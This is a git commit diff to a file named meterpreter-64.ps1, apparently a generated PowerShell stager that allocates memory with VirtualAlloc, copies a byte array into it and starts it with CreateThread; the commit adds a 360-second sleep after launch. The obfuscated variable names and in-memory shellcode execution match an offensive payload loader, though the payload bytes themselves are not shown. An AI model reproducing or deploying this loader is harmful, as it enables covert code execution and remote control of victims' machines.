867b976279f29bf8ac9ea2775503baba8c2ab2ab
SanderBougrine-TC <73898576+SanderBougrine-TC@users.noreply.github.com>
2021-03-12 17:40:37 +0100

    Update meterpreter-64.ps1

--- meterpreter-64.ps1
+++ meterpreter-64.ps1
@@ -15,3 +15,4 @@ $SlbfvEtcIHmRq = $azLGeJipW::VirtualAlloc(0,[Math]::Max($HRSVxduVu.Length,0x1000
 [System.Runtime.InteropServices.Marshal]::Copy($HRSVxduVu,0,$SlbfvEtcIHmRq,$HRSVxduVu.Length)
 
 $azLGeJipW::CreateThread(0,0,$SlbfvEtcIHmRq,0,0,0)
+sleep 360
